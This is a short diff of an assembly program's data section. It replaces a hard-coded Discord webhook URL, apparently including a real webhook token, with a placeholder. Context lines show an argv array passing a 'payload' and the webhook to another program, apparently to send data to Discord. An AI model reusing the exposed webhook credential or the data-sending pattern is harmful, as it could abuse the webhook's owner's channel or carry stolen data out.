@@ -24,7 +24,7 @@ section .data
 	suffix_bytes equ 3
 
 	; Discord webhook
-	webhook_url db "https://discord.com/api/webhooks/1410146214359335035/UIwjmtSb5COBNI8jXLN0UHGblXeM3gJ5h6o-R9r-LiGp7027rhh5b_vC9-osCyAQEpFJ", 0
+	webhook_url db "DISCORD WEBHOOK HERE", 0
 
 	; Arg array
 	argv dq prog, arg1, arg2, arg3, arg4, arg5, payload, webhook_url, 0
